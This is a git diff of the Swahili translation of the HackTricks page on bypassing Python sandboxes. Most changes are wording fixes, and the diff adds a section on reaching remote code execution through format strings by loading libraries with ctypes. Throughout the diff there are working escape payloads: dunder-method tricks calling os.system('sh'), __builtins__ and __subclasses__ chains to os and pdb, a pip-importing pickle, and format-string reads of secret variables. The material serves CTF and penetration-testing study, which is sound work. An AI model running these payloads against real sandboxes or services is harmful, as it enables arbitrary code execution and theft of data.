@@ -1,8 +1,8 @@
 # Bypass Python sandboxes
 
 {% hint style="success" %}
-Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
@@ -15,7 +15,7 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 </details>
 {% endhint %}
 
-Hizi ni baadhi ya mbinu za kupita kinga za sandbox za python na kutekeleza amri zisizo na mipaka.
+Hizi ni baadhi ya mbinu za kupita kinga za sanduku la python na kutekeleza amri zisizo na mipaka.
 
 ## Maktaba za Kutekeleza Amri
 
@@ -52,7 +52,7 @@ open('/var/www/html/input', 'w').write('123')
 execfile('/usr/lib/python2.7/os.py')
 system('ls')
 ```
-Kumbuka kwamba _**open**_ na _**read**_ kazi zinaweza kuwa na manufaa ili **kusoma faili** ndani ya sandbox ya python na **kuandika baadhi ya msimbo** ambao unaweza **kutekeleza** ili **kuzidi** sandbox.
+Kumbuka kwamba _**open**_ na _**read**_ kazi zinaweza kuwa na manufaa ili **kusoma faili** ndani ya sandbox ya python na **kuandika baadhi ya msimbo** ambao unaweza **kutekeleza** ili **kuepuka** sandbox.
 
 {% hint style="danger" %}
 **Python2 input()** kazi inaruhusu kutekeleza msimbo wa python kabla ya programu kuanguka.
@@ -62,12 +62,12 @@ Python hujaribu **kuchota maktaba kutoka kwa saraka ya sasa kwanza** (amri ifuat
 
 ![](<../../../.gitbook/assets/image (559).png>)
 
-## Kuzidi sandbox ya pickle na pakiti za python zilizowekwa kwa default
+## Kuepuka sandbox ya pickle na pakiti za python zilizowekwa kwa default
 
 ### Pakiti za default
 
 Unaweza kupata **orodha ya pakiti zilizowekwa awali** hapa: [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
-Kumbuka kwamba kutoka kwa pickle unaweza kufanya mazingira ya python **kuagiza maktaba yoyote** iliyowekwa kwenye mfumo.\
+Kumbuka kwamba kutoka kwa pickle unaweza kufanya mazingira ya python **kuagiza maktaba zisizo za kawaida** zilizowekwa katika mfumo.\
 Kwa mfano, pickle ifuatayo, itakapochukuliwa, itakuwa inagiza maktaba ya pip kuitumia:
 ```python
 #Note that here we are importing the pip library so the pickle is created correctly
@@ -197,7 +197,7 @@ Ikiwa unaweza **kutangaza darasa** na **kuunda kitu** cha darasa hilo unaweza **
 
 #### RCE na madarasa ya kawaida
 
-Unaweza kubadilisha baadhi ya **mbinu za darasa** (_kwa kupita mbinu za darasa zilizopo au kuunda darasa jipya_) ili kufanya ziweze **kutekeleza msimbo wa kawaida** wakati **zinapochochewa** bila kuziita moja kwa moja.
+Unaweza kubadilisha baadhi ya **mbinu za darasa** (_kwa kupita mbinu za darasa zilizopo au kuunda darasa jipya_) ili kufanya ziweze **kutekeleza msimbo wa kiholela** wakati **zinapochochewa** bila kuziita moja kwa moja.
 ```python
 # This class has 3 different ways to trigger RCE without directly calling any function
 class RCE:
@@ -247,9 +247,9 @@ __iand__ (k = 'import os; os.system("sh")')
 __ior__ (k |= 'import os; os.system("sh")')
 __ixor__ (k ^= 'import os; os.system("sh")')
 ```
-#### Kuunda vitu kwa [metaclasses](https://docs.python.org/3/reference/datamodel.html#metaclasses)
+#### Kuunda vitu na [metaclasses](https://docs.python.org/3/reference/datamodel.html#metaclasses)
 
-Jambo muhimu ambalo metaclasses linatufanya ni **kuunda mfano wa darasa, bila kuita mjenzi** moja kwa moja, kwa kuunda darasa jipya na darasa lengwa kama metaclass.
+Jambo muhimu ambalo metaclasses zinaturuhusu kufanya ni **kuunda mfano wa darasa, bila kuita mjenzi** moja kwa moja, kwa kuunda darasa jipya na darasa lengwa kama metaclass.
 ```python
 # Code from https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/ and fixed
 # This will define the members of the "subclass"
@@ -322,7 +322,7 @@ pass
 * [**Builtins functions of python2**](https://docs.python.org/2/library/functions.html)
 * [**Builtins functions of python3**](https://docs.python.org/3/library/functions.html)
 
-Ikiwa unaweza kufikia kituo cha **`__builtins__`** unaweza kuagiza maktaba (zingatia kwamba unaweza pia kutumia hapa uwakilishi mwingine wa maandiko ulioonyeshwa katika sehemu ya mwisho):
+Ikiwa unaweza kufikia kitu **`__builtins__`** unaweza kuagiza maktaba (zingatia kwamba unaweza pia kutumia hapa uwakilishi mwingine wa mfuatano ulioonyeshwa katika sehemu ya mwisho):
 ```python
 __builtins__.__import__("os").system("ls")
 __builtins__.__dict__['__import__']("os").system("ls")
@@ -392,7 +392,7 @@ __builtins__["__import__"]("os").system("ls")
 ```
 ## Globals and locals
 
-Kuangalia **`globals`** na **`locals`** ni njia nzuri ya kujua ni nini unaweza kufikia.
+Kuangalia **`globals`** na **`locals`** ni njia nzuri ya kujua kile unachoweza kufikia.
 ```python
 >>> globals()
 {'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'attr': <module 'attr' from '/usr/local/lib/python3.9/site-packages/attr.py'>, 'a': <class 'importlib.abc.Finder'>, 'b': <class 'importlib.abc.MetaPathFinder'>, 'c': <class 'str'>, '__warningregistry__': {'version': 0, ('MetaPathFinder.find_module() is deprecated since Python 3.4 in favor of MetaPathFinder.find_spec() (available since 3.4)', <class 'DeprecationWarning'>, 1): True}, 'z': <class 'str'>}
@@ -416,9 +416,9 @@ class_obj.__init__.__globals__
 [ x for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__)]
 [<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
 ```
-[**Hapa kuna kazi kubwa zaidi**](./#recursive-search-of-builtins-globals) ya kutafuta makumi/**miyamoja** ya **mahali** ambapo unaweza kupata **globals**.
+[**Hapa kuna kazi kubwa zaidi**](./#recursive-search-of-builtins-globals) ya kutafuta makumi/**mamia** ya **mahali** ambapo unaweza kupata **globals**.
 
-## Gundua Utendaji wa Kijichochezi
+## Gundua Utendaji wa Kijinga
 
 Hapa nataka kuelezea jinsi ya kugundua kwa urahisi **kazi hatari zaidi zilizopakiwa** na kupendekeza mashambulizi ya kuaminika zaidi.
 
@@ -454,7 +454,7 @@ defined_func.__class__.__base__.__subclasses__()
 ```
 ### Kutafuta maktaba hatari zilizopakiwa
 
-Kwa mfano, kujua kwamba kwa maktaba **`sys`** inawezekana **kuagiza maktaba zisizo na mipaka**, unaweza kutafuta **moduli zote zilizopakiwa ambazo zimeagiza sys ndani yao**:
+Kwa mfano, kujua kwamba kwa kutumia maktaba **`sys`** inawezekana **kuagiza maktaba zisizo na mipaka**, unaweza kutafuta **moduli zote zilizopakiwa ambazo zinaagiza sys ndani yao**:
 ```python
 [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ]
 ['_ModuleLock', '_DummyModuleLock', '_ModuleLockManager', 'ModuleSpec', 'FileLoader', '_NamespacePath', '_NamespaceLoader', 'FileFinder', 'zipimporter', '_ZipImportResourceReader', 'IncrementalEncoder', 'IncrementalDecoder', 'StreamReaderWriter', 'StreamRecoder', '_wrap_close', 'Quitter', '_Printer', 'WarningMessage', 'catch_warnings', '_GeneratorContextManagerBase', '_BaseExitStack', 'Untokenizer', 'FrameSummary', 'TracebackException', 'CompletedProcess', 'Popen', 'finalize', 'NullImporter', '_HackedGetData', '_localized_month', '_localized_day', 'Calendar', 'different_locale', 'SSLObject', 'Request', 'OpenerDirector', 'HTTPPasswordMgr', 'AbstractBasicAuthHandler', 'AbstractDigestAuthHandler', 'URLopener', '_PaddedFile', 'CompressedValue', 'LogRecord', 'PercentStyle', 'Formatter', 'BufferingFormatter', 'Filter', 'Filterer', 'PlaceHolder', 'Manager', 'LoggerAdapter', '_LazyDescr', '_SixMetaPathImporter', 'MimeTypes', 'ConnectionPool', '_LazyDescr', '_SixMetaPathImporter', 'Bytecode', 'BlockFinder', 'Parameter', 'BoundArguments', 'Signature', '_DeprecatedValue', '_ModuleWithDeprecations', 'Scrypt', 'WrappedSocket', 'PyOpenSSLContext', 'ZipInfo', 'LZMACompressor', 'LZMADecompressor', '_SharedFile', '_Tellable', 'ZipFile', 'Path', '_Flavour', '_Selector', 'JSONDecoder', 'Response', 'monkeypatch', 'InstallProgress', 'TextProgress', 'BaseDependency', 'Origin', 'Version', 'Package', '_Framer', '_Unframer', '_Pickler', '_Unpickler', 'NullTranslations']
@@ -498,7 +498,7 @@ Tunaweza kufanya jambo hilo hilo na **maktaba nyingine** ambazo tunajua zinaweza
 #pdb
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pdb" in x.__init__.__globals__ ][0]["pdb"].os.system("ls")
 ```
-Zaidi ya hayo, tunaweza hata kutafuta ni moduli zipi zinazoleta maktaba za uhalifu:
+Zaidi ya hayo, tunaweza hata kutafuta ni moduli zipi zinazopakia maktaba za uhalifu:
 ```python
 bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
 for b in bad_libraries_names:
@@ -679,11 +679,6 @@ You can check the output of this script on this page:
 ## Python Format String
 
 Ikiwa unatumia **string** kwa python ambayo itafanywa **formatted**, unaweza kutumia `{}` kufikia **habari za ndani za python.** Unaweza kutumia mifano ya awali kufikia globals au builtins kwa mfano.
-
-{% hint style="info" %}
-Hata hivyo, kuna **kikomo**, unaweza tu kutumia alama `.[]`, hivyo huwezi **kufanya kazi yoyote isiyo ya kawaida**, bali kusoma habari.\
-_**Ikiwa unajua jinsi ya kutekeleza msimbo kupitia udhaifu huu, tafadhali niwasiliane.**_
-{% endhint %}
 ```python
 # Example from https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/
 CONFIG = {
@@ -743,16 +738,60 @@ Angalia pia ukurasa ufuatao kwa vifaa ambavyo vitasoma **habari nyeti kutoka kwa
 
 # Access an element through several links
 {whoami.__globals__[server].__dict__[bridge].__dict__[db].__dict__}
+
+# Example from https://corgi.rip/posts/buckeye-writeups/
+secret_variable = "clueless"
+x = new_user.User(username='{i.find.__globals__[so].mapperlib.sys.modules[__main__].secret_variable}',password='lol')
+str(x) # Out: clueless
 ```
-## Kuchambua Vitu vya Python
+### Kutoka muundo hadi RCE kupakia maktaba
+
+Kulingana na [**TypeMonkey chall kutoka kwa andiko hili**](https://corgi.rip/posts/buckeye-writeups/), inawezekana kupakia maktaba zisizo za kawaida kutoka kwenye diski kwa kutumia udhaifu wa muundo wa mfuatano katika python.
+
+Kama ukumbusho, kila wakati kitendo kinapofanywa katika python, kazi fulani inatekelezwa. Kwa mfano, `2*3` itatekeleza **`(2).mul(3)`** au **`{'a':'b'}['a']`** itakuwa **`{'a':'b'}.__getitem__('a')`**.
+
+Una mengi kama haya katika sehemu [**Python execution without calls**](./#python-execution-without-calls).
+
+Udhaifu wa muundo wa mfuatano wa python haukuruhusu kutekeleza kazi (haukuruhusu kutumia mabano), hivyo si rahisi kupata RCE kama `'{0.system("/bin/sh")}'.format(os)`.\
+Hata hivyo, inawezekana kutumia `[]`. Kwa hivyo, ikiwa maktaba ya kawaida ya python ina **`__getitem__`** au **`__getattr__`** ambayo inatekeleza msimbo usio wa kawaida, inawezekana kuutumia vibaya ili kupata RCE.
+
+Kutafuta kifaa kama hicho katika python, andiko linapendekeza hii [**Github search query**](https://github.com/search?q=repo%3Apython%2Fcpython+%2Fdef+%28\_\_getitem\_\_%7C\_\_getattr\_\_%29%2F+path%3ALib%2F+-path%3ALib%2Ftest%2F\&type=code). Ambapo alipata hii [moja](https://github.com/python/cpython/blob/43303e362e3a7e2d96747d881021a14c7f7e3d0b/Lib/ctypes/\_\_init\_\_.py#L463):
+```python
+class LibraryLoader(object):
+def __init__(self, dlltype):
+self._dlltype = dlltype
+
+def __getattr__(self, name):
+if name[0] == '_':
+raise AttributeError(name)
+try:
+dll = self._dlltype(name)
+except OSError:
+raise AttributeError(name)
+setattr(self, name, dll)
+return dll
+
+def __getitem__(self, name):
+return getattr(self, name)
+
+cdll = LibraryLoader(CDLL)
+pydll = LibraryLoader(PyDLL)
+```
+Hii kifaa inaruhusu **kupakia maktaba kutoka diski**. Kwa hivyo, inahitajika kwa namna fulani **kuandika au kupakia maktaba ili kupakia** iliyokusanywa ipasavyo kwenye seva iliyoathiriwa.
+```python
+'{i.find.__globals__[so].mapperlib.sys.modules[ctypes].cdll[/path/to/file]}'
+```
+The challenge actually abuses another vulnerability in the server that allows to create arbitrary files in the servers disk.
+
+## Dissecting Python Objects
 
 {% hint style="info" %}
-Ikiwa unataka **kujifunza** kuhusu **python bytecode** kwa undani soma hii **kuandika** nzuri kuhusu mada: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
+If you want to **learn** about **python bytecode** in depth read this **awesome** post about the topic: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
 {% endhint %}
 
-Katika baadhi ya CTFs unaweza kupewa jina la **kazi maalum ambapo bendera** inapatikana na unahitaji kuona **mambo ya ndani** ya **kazi** ili kuipata.
+Katika baadhi ya CTFs unaweza kupatiwa jina la **kazi maalum ambapo bendera** inapatikana na unahitaji kuona **mambo ya ndani** ya **kazi** hiyo ili kuipata.
 
-Hii ndiyo kazi ya kuchambua:
+Hii ndiyo kazi ya kukagua:
 ```python
 def get_flag(some_input):
 var1=1
@@ -785,7 +824,7 @@ CustomClassObject.__class__.__init__.__globals__
 
 ### **Kufikia msimbo wa kazi**
 
-**`__code__`** na `func_code`: Unaweza **kufikia** sifa hii ya kazi ili **kupata kitu cha msimbo** cha kazi.
+**`__code__`** na `func_code`: Unaweza **kufikia** sifa hii ya kazi ili **kupata kitu cha msimbo** cha kazi hiyo.
 ```python
 # In our current example
 get_flag.__code__
@@ -895,10 +934,10 @@ dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x0
 44 LOAD_CONST          0 (0)
 47 RETURN_VALUE
 ```
-## Compiling Python
+## Kuunda Python
 
 Sasa, hebu tufikirie kwamba kwa namna fulani unaweza **kutoa taarifa kuhusu kazi ambayo huwezi kuendesha** lakini unahitaji **kuendesha**.\
-Kama katika mfano ufuatao, unaweza **kufikia kitu cha msimbo** cha kazi hiyo, lakini kwa kusoma tu disassemble hujui jinsi ya kuhesabu bendera** (_fikiria kazi ngumu zaidi ya `calc_flag`_)
+Kama katika mfano ufuatao, unaweza **kufikia kituo cha msimbo** cha kazi hiyo, lakini kwa kusoma tu disassemble hujui jinsi ya kuhesabu bendera** (_fikiria kazi ngumu zaidi ya `calc_flag`_)
 ```python
 def get_flag(some_input):
 var1=1
@@ -988,7 +1027,7 @@ mydict['__builtins__'] = __builtins__
 codeobj = code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ())
 function_type(codeobj, mydict, None, None, None)()
 ```
-Ikiwa huwezi kufikia `eval` au `exec` unaweza kuunda **kazi sahihi**, lakini kuitwa moja kwa moja kawaida kutashindwa na: _mwandamizi haupatikani katika hali iliyozuiliwa_. Hivyo unahitaji **kazi ambayo si katika mazingira yaliyopunguzika ili kuitwa kazi hii.**
+Ikiwa huwezi kufikia `eval` au `exec` unaweza kuunda **kazi sahihi**, lakini kuitaja moja kwa moja kawaida kutashindwa na: _mwandamizi haupatikani katika hali iliyozuiliwa_. Hivyo unahitaji **kazi ambayo haipo katika mazingira yaliyopunguzika kuitaja kazi hii.**
 ```python
 #Compile a regular print
 ftype = type(lambda: None)
@@ -1031,18 +1070,17 @@ will be bypassed
 * [https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html](https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html)
 * [https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)
 
-
 {% hint style="success" %}
-Jifunze na fanya mazoezi ya AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Jifunze na fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Support HackTricks</summary>
 
-* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
-* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuatilie** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki mbinu za hacking kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
